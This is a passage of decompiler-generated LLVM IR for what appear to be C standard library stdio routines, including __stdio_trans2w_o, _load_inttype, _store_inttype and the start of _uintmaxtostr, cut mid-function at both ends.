  %v3_80646ac = inttoptr i32 %v3_806467d to i8*
  %v4_80646ac = call i32 @memcpy(i8* %v3_80646ac, i32 %arg1, i32 %v0_80646a8)
  store i32 %v4_80646ac, i32* %eax.global-to-local, align 4
  %v0_80646b4 = load i32, i32* @esi, align 4
  %v1_80646b4 = add i32 %v0_80646b4, 16
  %v2_80646b4 = inttoptr i32 %v1_80646b4 to i32*
  %v3_80646b4 = load i32, i32* %v2_80646b4, align 4
  %v4_80646b4 = load i32, i32* @ebp, align 4
  %v5_80646b4 = add i32 %v4_80646b4, %v3_80646b4
  %v15_80646b4 = icmp eq i32 %v5_80646b4, 0
  store i1 %v15_80646b4, i1* %zf.global-to-local, align 1
  store i32 %v5_80646b4, i32* %v2_80646b4, align 4
  %v0_80646b7 = load i32, i32* @esi, align 4
  %v1_80646b7 = add i32 %v0_80646b7, 1
  %v2_80646b7 = inttoptr i32 %v1_80646b7 to i8*
  %v3_80646b7 = load i8, i8* %v2_80646b7, align 1
  %v4_80646b7 = urem i8 %v3_80646b7, 2
  %v5_80646b7 = icmp eq i8 %v4_80646b7, 0
  store i1 %v5_80646b7, i1* %zf.global-to-local, align 1
  br i1 %v5_80646b7, label %dec_label_pc_806474c, label %dec_label_pc_80646c1

dec_label_pc_80646c1:                             ; preds = %dec_label_pc_80646a8
  %v0_80646c5 = load i32, i32* @edi, align 4
  %v3_80646c6 = trunc i32 %v0_80646c5 to i8
  %v4_80646c6 = call i32 @memrchr(i8 %v3_80646c6, i32 10, i32 %v4_80646ac)
  store i32 %v4_80646c6, i32* %eax.global-to-local, align 4
  %v1_80646ce = icmp eq i32 %v4_80646c6, 0
  store i1 %v1_80646ce, i1* %zf.global-to-local, align 1
  br i1 %v1_80646ce, label %dec_label_pc_806474c, label %dec_label_pc_80646d2

dec_label_pc_80646d2:                             ; preds = %dec_label_pc_80646c1
  %v9_80646d2 = icmp eq i32* %stack_var_-28, inttoptr (i32 12 to i32*)
  store i1 %v9_80646d2, i1* %zf.global-to-local, align 1
  %v0_80646d5 = load i32, i32* @esi, align 4
  %v1_80646d6 = call i32 @__stdio_wcommit(i32 %v0_80646d5)
  store i32 %v1_80646d6, i32* %eax.global-to-local, align 4
  %v1_80646de = icmp eq i32 %v1_80646d6, 0
  store i1 %v1_80646de, i1* %zf.global-to-local, align 1
  br i1 %v1_80646de, label %dec_label_pc_806474c, label %dec_label_pc_80646e2

dec_label_pc_80646e2:                             ; preds = %dec_label_pc_80646d2
  %v1_80646e2 = load i32, i32* @ebp, align 4
  %tmp23 = icmp ule i32 %v1_80646d6, %v1_80646e2
  %v5_80646e4 = select i1 %tmp23, i32 %v1_80646d6, i32 %v1_80646e2
  %v5_80646ed = sub i32 %v1_80646e2, %v5_80646e4
  %v15_80646ed = icmp eq i32 %v5_80646ed, 0
  store i1 %v15_80646ed, i1* %zf.global-to-local, align 1
  store i32 %v5_80646ed, i32* %eax.global-to-local, align 4
  store i32 %v5_80646e4, i32* @ecx, align 4
  %v0_80646f5 = load i32, i32* @edi, align 4
  %v2_80646f5 = add i32 %v0_80646f5, %v5_80646ed
  store i32 %v2_80646f5, i32* %ebx.global-to-local, align 4
  store i32 %v2_80646f5, i32* %edi.global-to-local, align 4
  %v1_80646fa = icmp eq i32 %v5_80646e4, 0
  br i1 %v1_80646fa, label %dec_label_pc_8064707.thread, label %dec_label_pc_80646fc

dec_label_pc_80646fc:                             ; preds = %dec_label_pc_80646e2
  %v1_80646fc = and i32 %v5_80646ed, -256
  %v2_80646fc = or i32 %v1_80646fc, 10
  store i32 %v2_80646fc, i32* %eax.global-to-local, align 4
  %v1_80646fe = inttoptr i32 %v2_80646f5 to i8*
  %v2_80646fe = call i32 @_strlen(i8* %v1_80646fe)
  %v3_80646fe = mul i32 %v2_80646fe, -1
  %v4_80646fe = add i32 %v3_80646fe, -2
  store i32 %v4_80646fe, i32* @ecx, align 4
  %v0_8064700 = load i32, i32* %edi.global-to-local, align 4
  %v1_8064700 = add i32 %v0_8064700, -1
  store i32 %v1_8064700, i32* %edi.global-to-local, align 4
  %v0_8064703 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8064703, label %dec_label_pc_8064707, label %dec_label_pc_8064707.thread

dec_label_pc_8064707.thread:                      ; preds = %dec_label_pc_80646e2, %dec_label_pc_80646fc
  store i32 0, i32* %edi.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_806474c

dec_label_pc_8064707:                             ; preds = %dec_label_pc_80646fc
  %v1_8064707 = icmp eq i32 %v1_8064700, 0
  store i1 %v1_8064707, i1* %zf.global-to-local, align 1
  br i1 %v1_8064707, label %dec_label_pc_806474c, label %dec_label_pc_806470b

dec_label_pc_806470b:                             ; preds = %dec_label_pc_8064707
  store i32 %v5_80646e4, i32* @ecx, align 4
  %v0_806470f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064700.neg = sub i32 1, %v0_8064700
  %v2_806470f = add i32 %v1_8064700.neg, %v5_80646e4
  %v2_8064712 = add i32 %v2_806470f, %v0_806470f
  store i32 %v2_8064712, i32* %eax.global-to-local, align 4
  %v0_8064714 = load i32, i32* @esi, align 4
  %v1_8064714 = add i32 %v0_8064714, 16
  %v2_8064714 = inttoptr i32 %v1_8064714 to i32*
  %v3_8064714 = load i32, i32* %v2_8064714, align 4
  %v5_8064714 = sub i32 %v3_8064714, %v2_8064712
  store i32 %v5_8064714, i32* %v2_8064714, align 4
  %v0_8064717 = load i32, i32* @ebp, align 4
  %v1_8064717 = load i32, i32* %eax.global-to-local, align 4
  %v2_8064717 = sub i32 %v0_8064717, %v1_8064717
  %v12_8064717 = icmp eq i32 %v2_8064717, 0
  store i1 %v12_8064717, i1* %zf.global-to-local, align 1
  store i32 %v2_8064717, i32* @ebp, align 4
  br label %dec_label_pc_806474c

dec_label_pc_806471b:                             ; preds = %dec_label_pc_80646a2
  %v2_806471b = add i32 %arg3, 8
  %v3_806471b = inttoptr i32 %v2_806471b to i32*
  %v4_806471b = load i32, i32* %v3_806471b, align 4
  %v15_806471b = icmp eq i32 %v3_806467d, %v4_806471b
  store i1 %v15_806471b, i1* %zf.global-to-local, align 1
  br i1 %v15_806471b, label %dec_label_pc_8064734, label %dec_label_pc_8064720

dec_label_pc_8064720:                             ; preds = %dec_label_pc_806471b
  %v9_8064720 = icmp eq i32* %stack_var_-28, inttoptr (i32 12 to i32*)
  store i1 %v9_8064720, i1* %zf.global-to-local, align 1
  %v1_8064724 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8064724, i32* %eax.global-to-local, align 4
  %v1_806472c = icmp eq i32 %v1_8064724, 0
  store i1 %v1_806472c, i1* %zf.global-to-local, align 1
  br i1 %v1_806472c, label %dec_label_pc_8064720.dec_label_pc_8064734_crit_edge, label %dec_label_pc_8064730

dec_label_pc_8064720.dec_label_pc_8064734_crit_edge: ; preds = %dec_label_pc_8064720
  %v0_8064734.pre = load i32, i32* @ebp, align 4
  %v0_8064738.pre = load i32, i32* @edi, align 4
  %v0_806473c.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8064734

dec_label_pc_8064730:                             ; preds = %dec_label_pc_8064720
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_806474c

dec_label_pc_8064734:                             ; preds = %dec_label_pc_8064720.dec_label_pc_8064734_crit_edge, %dec_label_pc_806471b, %entry
  %v0_806473c = phi i32 [ %v0_806473c.pre, %dec_label_pc_8064720.dec_label_pc_8064734_crit_edge ], [ %arg3, %dec_label_pc_806471b ], [ %arg3, %entry ]
  %v0_8064738 = phi i32 [ %v0_8064738.pre, %dec_label_pc_8064720.dec_label_pc_8064734_crit_edge ], [ %arg1, %dec_label_pc_806471b ], [ %arg1, %entry ]
  %v0_8064734 = phi i32 [ %v0_8064734.pre, %dec_label_pc_8064720.dec_label_pc_8064734_crit_edge ], [ %arg2, %dec_label_pc_806471b ], [ %arg2, %entry ]
  %v9_8064740 = icmp eq i32* %stack_var_-28, inttoptr (i32 -12 to i32*)
  store i1 %v9_8064740, i1* %zf.global-to-local, align 1
  store i32 %v0_806465c, i32* @ebp, align 4
  %v4_8064747 = inttoptr i32 %v0_806473c to i16*
  %v5_8064747 = call i32 @__stdio_WRITE(i16* %v4_8064747, i32 %v0_8064738, i32 %v0_8064734, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8064747, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806474c

dec_label_pc_806474c:                             ; preds = %dec_label_pc_8064707.thread, %dec_label_pc_8064707, %dec_label_pc_80646d2, %dec_label_pc_80646c1, %dec_label_pc_80646a8, %dec_label_pc_8064730, %dec_label_pc_806470b, %dec_label_pc_8064685, %dec_label_pc_8064734
  %v0_806474c = load i32, i32* @esp, align 4
  %v9_806474c = icmp eq i32 %v0_806474c, -12
  store i1 %v9_806474c, i1* %zf.global-to-local, align 1
  %v0_806474f = load i32, i32* @ebp, align 4
  store i32 %v0_806474f, i32* %eax.global-to-local, align 4
  %v2_8064751 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8064751, i32* @ebx, align 4
  store i32 %v0_806465e, i32* @esi, align 4
  store i32 %v0_806465d, i32* @edi, align 4
  store i32 %v0_806465c, i32* @ebp, align 4
  ret i32 %v0_806474f

; uselistorder directives
  uselistorder i1 %v15_806471b, { 1, 0 }
  uselistorder i32 %v2_8064712, { 1, 0 }
  uselistorder i32 %v5_80646ed, { 1, 0, 2, 3 }
  uselistorder i32 %v5_80646e4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v1_80646e2, { 2, 1, 0 }
  uselistorder i32 %v1_80646d6, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80646a2, { 4, 0, 5, 3, 1, 2 }
  uselistorder i32 %v3_806467d, { 0, 1, 3, 2, 4 }
  uselistorder i1 %v13_8064679, { 1, 0 }
  uselistorder i32 %v0_806465c, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 3, 0, 6, 1, 2, 7 }
  uselistorder label %dec_label_pc_806474c, { 8, 5, 6, 1, 0, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_8064707.thread, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8064758 = load i32, i32* @ebx, align 4
  %v4_806475c = ptrtoint i16* %arg1 to i32
  store i32 %v4_806475c, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8064764 = load i16, i16* %arg1, align 2
  %v3_8064764 = zext i16 %v2_8064764 to i32
  store i32 %v3_8064764, i32* %eax.global-to-local, align 4
  %v2_8064767 = and i32 %v3_8064764, %arg2
  %v3_8064767 = icmp eq i32 %v2_8064767, 0
  %v1_8064769 = icmp eq i1 %v3_8064767, false
  br i1 %v1_8064769, label %dec_label_pc_8064777, label %dec_label_pc_806476b

dec_label_pc_806476b:                             ; preds = %entry
  %v1_806476b = and i32 %v3_8064764, 2176
  %v2_806476b = icmp eq i32 %v1_806476b, 0
  %v1_8064770 = icmp eq i1 %v2_806476b, false
  br i1 %v1_8064770, label %dec_label_pc_806477f, label %dec_label_pc_8064772

dec_label_pc_8064772:                             ; preds = %dec_label_pc_806476b
  %v2_8064772 = or i32 %v3_8064764, %arg2
  store i32 %v2_8064772, i32* %edx.global-to-local, align 4
  %v1_8064774 = trunc i32 %v2_8064772 to i16
  store i16 %v1_8064774, i16* %arg1, align 2
  %v0_8064777.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8064777

dec_label_pc_8064777:                             ; preds = %entry, %dec_label_pc_8064772
  %v0_80647c1 = phi i32 [ %v4_806475c, %entry ], [ %v0_8064777.pre, %dec_label_pc_8064772 ]
  %v1_8064777 = inttoptr i32 %v0_80647c1 to i16*
  %v2_8064777 = load i16, i16* %v1_8064777, align 2
  %v3_8064777 = zext i16 %v2_8064777 to i32
  store i32 %v3_8064777, i32* %edx.global-to-local, align 4
  %v2_806477a = and i16 %v2_8064777, 32
  %v3_806477a = icmp eq i16 %v2_806477a, 0
  br i1 %v3_806477a, label %dec_label_pc_8064798, label %dec_label_pc_806477f

dec_label_pc_806477f:                             ; preds = %dec_label_pc_8064777, %dec_label_pc_806476b
  store i32 -8, i32* %eax.global-to-local, align 4
  store i32 9, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_806478b

dec_label_pc_806478b:                             ; preds = %dec_label_pc_80647af, %dec_label_pc_806477f
  %v0_806478b = load i32, i32* @ebx, align 4
  %v1_806478b = inttoptr i32 %v0_806478b to i32*
  %v2_806478b = load i32, i32* %v1_806478b, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8064790 = or i32 %v2_806478b, 8
  store i32 %v1_8064790, i32* %eax.global-to-local, align 4
  %v1_8064793 = trunc i32 %v1_8064790 to i16
  %v3_8064793 = inttoptr i32 %v0_806478b to i16*
  store i16 %v1_8064793, i16* %v3_8064793, align 2
  br label %dec_label_pc_80647fa

dec_label_pc_8064798:                             ; preds = %dec_label_pc_8064777
  %v2_8064798 = urem i16 %v2_8064777, 4
  %v3_8064798 = icmp eq i16 %v2_8064798, 0
  br i1 %v3_8064798, label %dec_label_pc_80647e2, label %dec_label_pc_806479d

dec_label_pc_806479d:                             ; preds = %dec_label_pc_8064798
  %v2_806479d = and i32 %v3_8064777, 4
  %v3_806479d = icmp eq i32 %v2_806479d, 0
  %v1_80647a0 = icmp eq i1 %v3_806479d, false
  br i1 %v1_80647a0, label %dec_label_pc_80647ce, label %dec_label_pc_80647a2

dec_label_pc_80647a2:                             ; preds = %dec_label_pc_806479d
  %v1_80647a2 = add i32 %v0_80647c1, 20
  %v2_80647a2 = inttoptr i32 %v1_80647a2 to i32*
  %v3_80647a2 = load i32, i32* %v2_80647a2, align 4
  store i32 %v3_80647a2, i32* %eax.global-to-local, align 4
  %v2_80647a5 = add i32 %v0_80647c1, 16
  %v3_80647a5 = inttoptr i32 %v2_80647a5 to i32*
  %v4_80647a5 = load i32, i32* %v3_80647a5, align 4
  %v15_80647a5 = icmp eq i32 %v3_80647a2, %v4_80647a5
  %v1_80647a8 = icmp eq i1 %v15_80647a5, false
  br i1 %v1_80647a8, label %dec_label_pc_80647af, label %dec_label_pc_80647aa

dec_label_pc_80647aa:                             ; preds = %dec_label_pc_80647a2
  %v2_80647aa = and i32 %v3_8064777, 2
  %v3_80647aa = icmp eq i32 %v2_80647aa, 0
  br i1 %v3_80647aa, label %dec_label_pc_80647ce, label %dec_label_pc_80647af

dec_label_pc_80647af:                             ; preds = %dec_label_pc_80647aa, %dec_label_pc_80647a2
  %v1_80647af = and i32 %v3_8064777, 1024
  store i32 %v1_80647af, i32* %edx.global-to-local, align 4
  %tmp15 = udiv i32 %v1_80647af, 1024
  %tmp16 = xor i32 %tmp15, 3
  store i32 %tmp16, i32* %eax.global-to-local, align 4
  %v5_80647c2 = call i32 @__GI_fseek(i32 %v0_80647c1, i32 0, i32 %tmp16, i32 %v1_80647af)
  store i32 %v5_80647c2, i32* %eax.global-to-local, align 4
  %v1_80647ca = icmp eq i32 %v5_80647c2, 0
  %v1_80647cc = icmp eq i1 %v1_80647ca, false
  br i1 %v1_80647cc, label %dec_label_pc_806478b, label %dec_label_pc_80647af.dec_label_pc_80647ce_crit_edge

dec_label_pc_80647af.dec_label_pc_80647ce_crit_edge: ; preds = %dec_label_pc_80647af
  %v0_80647ce.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80647ce

dec_label_pc_80647ce:                             ; preds = %dec_label_pc_80647af.dec_label_pc_80647ce_crit_edge, %dec_label_pc_80647aa, %dec_label_pc_806479d
  %v2_80647d3 = phi i32 [ %v0_80647ce.pre, %dec_label_pc_80647af.dec_label_pc_80647ce_crit_edge ], [ %v0_80647c1, %dec_label_pc_80647aa ], [ %v0_80647c1, %dec_label_pc_806479d ]
  %v1_80647ce = inttoptr i32 %v2_80647d3 to i32*
  %v2_80647ce = load i32, i32* %v1_80647ce, align 4
  %v1_80647d0 = and i32 %v2_80647ce, -4
  store i32 %v1_80647d0, i32* %eax.global-to-local, align 4
  %v1_80647d3 = trunc i32 %v1_80647d0 to i16
  %v3_80647d3 = inttoptr i32 %v2_80647d3 to i16*
  store i16 %v1_80647d3, i16* %v3_80647d3, align 2
  %v0_80647d6 = load i32, i32* @ebx, align 4
  %v1_80647d6 = add i32 %v0_80647d6, 8
  %v2_80647d6 = inttoptr i32 %v1_80647d6 to i32*
  %v3_80647d6 = load i32, i32* %v2_80647d6, align 4
  store i32 %v3_80647d6, i32* %eax.global-to-local, align 4
  %v2_80647d9 = add i32 %v0_80647d6, 24
  %v3_80647d9 = inttoptr i32 %v2_80647d9 to i32*
  store i32 %v3_80647d6, i32* %v3_80647d9, align 4
  %v0_80647dc = load i32, i32* %eax.global-to-local, align 4
  %v1_80647dc = load i32, i32* @ebx, align 4
  %v2_80647dc = add i32 %v1_80647dc, 16
  %v3_80647dc = inttoptr i32 %v2_80647dc to i32*
  store i32 %v0_80647dc, i32* %v3_80647dc, align 4
  %v0_80647df = load i32, i32* %eax.global-to-local, align 4
  %v1_80647df = load i32, i32* @ebx, align 4
  %v2_80647df = add i32 %v1_80647df, 20
  %v3_80647df = inttoptr i32 %v2_80647df to i32*
  store i32 %v0_80647df, i32* %v3_80647df, align 4
  %v0_80647e2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80647e2

dec_label_pc_80647e2:                             ; preds = %dec_label_pc_8064798, %dec_label_pc_80647ce
  %v2_80647ef = phi i32 [ %v0_80647c1, %dec_label_pc_8064798 ], [ %v0_80647e2.pre, %dec_label_pc_80647ce ]
  %v1_80647e2 = inttoptr i32 %v2_80647ef to i32*
  %v2_80647e2 = load i32, i32* %v1_80647e2, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80647e6 = or i32 %v2_80647e2, 64
  %v1_80647e9 = urem i32 %v1_80647e6, 65536
  store i32 %v1_80647e9, i32* %eax.global-to-local, align 4
  %v3_80647ec = and i32 %v2_80647e2, 2816
  %v4_80647ec = icmp eq i32 %v3_80647ec, 0
  %v1_80647ef = trunc i32 %v1_80647e6 to i16
  %v3_80647ef = inttoptr i32 %v2_80647ef to i16*
  store i16 %v1_80647ef, i16* %v3_80647ef, align 2
  %v1_80647f2 = icmp eq i1 %v4_80647ec, false
  br i1 %v1_80647f2, label %dec_label_pc_80647fa, label %dec_label_pc_80647f4

dec_label_pc_80647f4:                             ; preds = %dec_label_pc_80647e2
  %v0_80647f4 = load i32, i32* @ebx, align 4
  %v1_80647f4 = add i32 %v0_80647f4, 12
  %v2_80647f4 = inttoptr i32 %v1_80647f4 to i32*
  %v3_80647f4 = load i32, i32* %v2_80647f4, align 4
  store i32 %v3_80647f4, i32* %eax.global-to-local, align 4
  %v2_80647f7 = add i32 %v0_80647f4, 28
  %v3_80647f7 = inttoptr i32 %v2_80647f7 to i32*
  store i32 %v3_80647f4, i32* %v3_80647f7, align 4
  br label %dec_label_pc_80647fa

dec_label_pc_80647fa:                             ; preds = %dec_label_pc_80647e2, %dec_label_pc_806478b, %dec_label_pc_80647f4
  %v0_80647fa = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80647fa, i32* %eax.global-to-local, align 4
  %v2_80647fc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80647fc, i32* %edx.global-to-local, align 4
  store i32 %v0_8064758, i32* @ebx, align 4
  ret i32 %v0_80647fa

; uselistorder directives
  uselistorder i32 %v1_80647e6, { 1, 0 }
  uselistorder i32 %v1_80647af, { 1, 0, 2 }
  uselistorder i32 %v0_80647c1, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_8064764, { 0, 2, 1, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7 }
  uselistorder i32 1024, { 0, 7, 3, 1, 2, 4, 6, 5, 8 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80647fa, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80647e2, { 1, 0 }
  uselistorder label %dec_label_pc_8064777, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v5_8064800 = icmp slt i32 %tmp4, 0
  %v3_8064834 = and i32 %tmp3, 2048
  %v4_8064834 = icmp eq i32 %v3_8064834, 0
  br i1 %v5_8064800, label %dec_label_pc_8064834, label %dec_label_pc_806480f

dec_label_pc_806480f:                             ; preds = %entry
  %v1_8064812 = icmp eq i1 %v4_8064834, false
  br i1 %v1_8064812, label %dec_label_pc_8064839, label %dec_label_pc_8064814

dec_label_pc_8064814:                             ; preds = %dec_label_pc_806480f
  %v6_8064814 = icmp eq i32 %tmp3, 256
  %v1_806481a = inttoptr i32 %tmp to i32*
  %v2_806481a = load i32, i32* %v1_806481a, align 4
  %v1_806481c = icmp eq i1 %v6_8064814, false
  br i1 %v1_806481c, label %dec_label_pc_8064823, label %dec_label_pc_806481e

dec_label_pc_806481e:                             ; preds = %dec_label_pc_8064814
  %v1_806481e = urem i32 %v2_806481a, 256
  br label %dec_label_pc_806482f

dec_label_pc_8064823:                             ; preds = %dec_label_pc_8064814
  %v1_8064823 = urem i32 %v2_806481a, 65536
  %v6_8064826 = icmp eq i32 %tmp3, 512
  %v3_806482c = select i1 %v6_8064826, i32 %v1_8064823, i32 %v2_806481a
  br label %dec_label_pc_806482f

dec_label_pc_806482f:                             ; preds = %dec_label_pc_806481e, %dec_label_pc_8064823
  %storemerge = phi i32 [ %v1_806481e, %dec_label_pc_806481e ], [ %v3_806482c, %dec_label_pc_8064823 ]
  store i32 0, i32* @edx, align 4
  ret i32 %storemerge

dec_label_pc_8064834:                             ; preds = %entry
  br i1 %v4_8064834, label %dec_label_pc_806483f, label %dec_label_pc_8064839

dec_label_pc_8064839:                             ; preds = %dec_label_pc_8064834, %dec_label_pc_806480f
  %v1_8064839 = add i32 %tmp, 4
  %v2_8064839 = inttoptr i32 %v1_8064839 to i32*
  %v3_8064839 = load i32, i32* %v2_8064839, align 4
  store i32 %v3_8064839, i32* @edx, align 4
  %v1_806483c = inttoptr i32 %tmp to i32*
  %v2_806483c = load i32, i32* %v1_806483c, align 4
  ret i32 %v2_806483c

dec_label_pc_806483f:                             ; preds = %dec_label_pc_8064834
  %v6_806483f = icmp eq i32 %tmp3, 256
  %v1_8064845 = inttoptr i32 %tmp to i32*
  %v2_8064845 = load i32, i32* %v1_8064845, align 4
  %v1_8064847 = icmp eq i1 %v6_806483f, false
  br i1 %v1_8064847, label %dec_label_pc_806484e, label %dec_label_pc_8064849

dec_label_pc_8064849:                             ; preds = %dec_label_pc_806483f
  %v1_8064849 = mul i32 %v2_8064845, 16777216
  %v2_8064849 = sdiv i32 %v1_8064849, 16777216
  br label %dec_label_pc_806485a

dec_label_pc_806484e:                             ; preds = %dec_label_pc_806483f
  %v1_806484e = mul i32 %v2_8064845, 65536
  %v2_806484e = sdiv i32 %v1_806484e, 65536
  %v6_8064851 = icmp eq i32 %tmp3, 512
  %v3_8064857 = select i1 %v6_8064851, i32 %v2_806484e, i32 %v2_8064845
  br label %dec_label_pc_806485a

dec_label_pc_806485a:                             ; preds = %dec_label_pc_8064849, %dec_label_pc_806484e
  %storemerge2 = phi i32 [ %v2_8064849, %dec_label_pc_8064849 ], [ %v3_8064857, %dec_label_pc_806484e ]
  %v1_806485c = ashr i32 %storemerge2, 31
  store i32 %v1_806485c, i32* @edx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v2_8064845, { 2, 0, 1 }
  uselistorder i32 %v2_806481a, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_806485a, { 1, 0 }
  uselistorder label %dec_label_pc_806482f, { 1, 0 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_5()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8064860 = load i32, i32* @ebx, align 4
  store i32 %v0_8064860, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8064865 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8064865, i32* %ebx.global-to-local, align 4
  %v4_8064869 = trunc i32 %tmp4 to i16
  %v6_8064871 = icmp eq i32 %tmp6, 256
  %v1_8064877 = icmp eq i1 %v6_8064871, false
  br i1 %v1_8064877, label %dec_label_pc_806487d, label %dec_label_pc_8064879

dec_label_pc_8064879:                             ; preds = %entry
  %v2_8064879 = trunc i32 %tmp4 to i8
  %v4_8064879 = bitcast i16* %tmp5 to i8*
  store i8 %v2_8064879, i8* %v4_8064879, align 1
  br label %dec_label_pc_806489b

dec_label_pc_806487d:                             ; preds = %entry
  %v6_806487d = icmp eq i32 %tmp6, 2048
  %v1_8064883 = icmp eq i1 %v6_806487d, false
  br i1 %v1_8064883, label %dec_label_pc_806488c, label %dec_label_pc_8064885

dec_label_pc_8064885:                             ; preds = %dec_label_pc_806487d
  %sext2 = mul i32 %tmp4, 65536
  %v1_8064885 = sdiv i32 %sext2, 65536
  %v3_8064885 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8064885, i32* %v3_8064885, align 4
  %v0_8064887 = load i32, i32* %edx.global-to-local, align 4
  %v1_8064887 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8064887 = add i32 %v1_8064887, 4
  %v3_8064887 = inttoptr i32 %v2_8064887 to i32*
  store i32 %v0_8064887, i32* %v3_8064887, align 4
  br label %dec_label_pc_806489b

dec_label_pc_806488c:                             ; preds = %dec_label_pc_806487d
  %v6_806488c = icmp eq i32 %tmp6, 512
  %v1_8064892 = icmp eq i1 %v6_806488c, false
  br i1 %v1_8064892, label %dec_label_pc_8064899, label %dec_label_pc_8064894

dec_label_pc_8064894:                             ; preds = %dec_label_pc_806488c
  store i16 %v4_8064869, i16* %tmp5, align 2
  br label %dec_label_pc_806489b

dec_label_pc_8064899:                             ; preds = %dec_label_pc_806488c
  %sext3 = mul i32 %tmp4, 65536
  %v1_8064899 = sdiv i32 %sext3, 65536
  %v3_8064899 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8064899, i32* %v3_8064899, align 4
  br label %dec_label_pc_806489b

dec_label_pc_806489b:                             ; preds = %dec_label_pc_8064894, %dec_label_pc_8064885, %dec_label_pc_8064879, %dec_label_pc_8064899
  %v2_806489b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_806489b, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_806489c = sdiv i32 %sext, 65536
  ret i32 %v1_806489c

; uselistorder directives
  uselistorder label %dec_label_pc_806489b, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %edi.global-to-local, align 4
  %v4_80648ab = ptrtoint i8* %arg1 to i32
  store i32 %v4_80648ab, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_80648b7 = icmp slt i32 %arg4, 0
  %v1_80648b9 = icmp eq i1 %v2_80648b7, false
  br i1 %v1_80648b9, label %dec_label_pc_80648da, label %dec_label_pc_80648bb

dec_label_pc_80648bb:                             ; preds = %entry
  %v1_80648bb = sub i32 0, %arg4
  store i32 %v1_80648bb, i32* %edi.global-to-local, align 4
  %v2_80648bd = icmp slt i32 %arg3, 0
  %v1_80648bf = icmp eq i1 %v2_80648bd, false
  br i1 %v1_80648bf, label %dec_label_pc_80648da, label %dec_label_pc_80648c1

dec_label_pc_80648c1:                             ; preds = %dec_label_pc_80648bb
  %v1_80648c1 = sub i32 0, %arg2
  %v5_80648c1 = icmp ne i32 %arg2, 0
  store i32 %v1_80648c1, i32* %ecx.global-to-local, align 4
  %v2_80648c3 = zext i1 %v5_80648c1 to i32
  %v3_80648c3 = add i32 %v2_80648c3, %arg3
  %v1_80648c6 = sub i32 0, %v3_80648c3
  store i32 %v1_80648c6, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80648da

dec_label_pc_80648da:                             ; preds = %entry, %dec_label_pc_80648bb, %dec_label_pc_80648c1
  %v0_80648df = phi i32 [ %v1_80648bb, %dec_label_pc_80648c1 ], [ %v1_80648bb, %dec_label_pc_80648bb ], [ %arg4, %entry ]
  %storemerge12 = phi i32 [ 1, %dec_label_pc_80648c1 ], [ 0, %dec_label_pc_80648bb ], [ 0, %entry ]
